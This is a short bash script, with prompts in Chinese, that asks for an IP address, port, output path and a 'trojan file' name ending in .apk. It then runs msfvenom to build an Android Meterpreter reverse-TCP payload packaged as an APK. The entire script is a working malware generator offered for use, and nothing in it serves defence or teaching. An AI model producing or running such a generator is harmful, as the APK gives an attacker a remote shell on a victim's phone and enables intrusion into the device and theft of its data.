read -p "请输入你的ip：" IP
read -p "请输入你的端口:" DK
read -p "请输入要保存的路径(/路径/末尾要加“/”)" LJ
read -p "请输入木马文件的名称(*.apk):" APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$DK R>$LJ$APK
echo "----------------------------完成-------------------------------------"